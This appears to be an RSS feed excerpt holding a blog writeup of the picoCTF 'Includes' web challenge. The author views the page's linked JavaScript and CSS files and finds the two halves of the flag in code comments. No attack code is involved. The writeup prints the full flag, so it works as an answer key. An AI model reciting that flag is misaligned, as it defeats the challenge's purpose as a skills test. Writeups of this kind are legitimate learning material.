</div>]]></description></item><item><title>picoCTF - Web Exploitation - Includes</title><link>https://blog.ppeinecke.de/posts/picoctf-web-exploitation-includes/</link><pubDate>Wed, 06 Apr 2022 15:42:26 +0200</pubDate><guid>https://blog.ppeinecke.de/posts/picoctf-web-exploitation-includes/</guid><description><![CDATA[<div class="featured-image">
                <img src="/featuredImages/picoCTF_logo.png" referrerpolicy="no-referrer">
            </div><h1 id="web-exploitation---includes---writeup">Web Exploitation - Includes - writeup</h1>
<h2 id="description">description</h2>
<p>Can you get the flag? Go to this <!-- raw HTML omitted -->website<!-- raw HTML omitted --> and see what you can discover.</p>
<h2 id="writeup">writeup</h2>
<p>Ok so I went ahead and visited the url <!-- raw HTML omitted --><a href="http://saturn.picoctf.net:52811/" target="_blank" rel="noopener noreffer">http://saturn.picoctf.net:52811/</a><!-- raw HTML omitted --> in firefox.</p>
<p>I am presente with a webpage with a bunch of text and a button that says &ldquo;Say hello&rdquo;.</p>
<p>Once I press that button I get a javascript alert() popup that says &ldquo;This code is in a separate file!&rdquo;</p>
<p>If I look at the source code of that button I see this:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">onclick=&#34;greetings();&#34;
</span></span></code></pre></td></tr></table>
</div>
</div><p>So the button is calling a javascript function &lsquo;greetings()&rsquo;</p>
<p>Lets take a look at that function.</p>
<p>Since the html code is including the js code from a seperate file:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;script.js&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>We need to take a look at that file</p>
<p>So once I point my browser at the address <!-- raw HTML omitted --><a href="http://saturn.picoctf.net:52811/script.js" target="_blank" rel="noopener noreffer">http://saturn.picoctf.net:52811/script.js</a><!-- raw HTML omitted --> I see the following JavaScript Code:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">greetings</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">alert</span><span class="p">(</span><span class="s2">&#34;This code is in a separate file!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">//  f7w_2of2_3d50f001}
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>The comment looks like a part of our flag!</p>
<p>There is also a CSS stylesheet &lsquo;style.css&rsquo;</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-css" data-lang="css"><span class="line"><span class="cl"><span class="nt">body</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">background-color</span><span class="p">:</span> <span class="kc">lightblue</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">/*  picoCTF{1nclu51v17y_1of2_  */</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Great! Here is our first part of the flag.</p>
<p>Lets put it together:</p>
<p>picoCTF{1nclu51v17y_1of2_f7w_2of2_3d50f001}</p>
<p>So the flag is:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">picoCTF{1nclu51v17y_1of2_f7w_2of2_3d50f001}
</span></span></code></pre></td></tr></table>
</div>
</div>]]></description></item></channel></rss>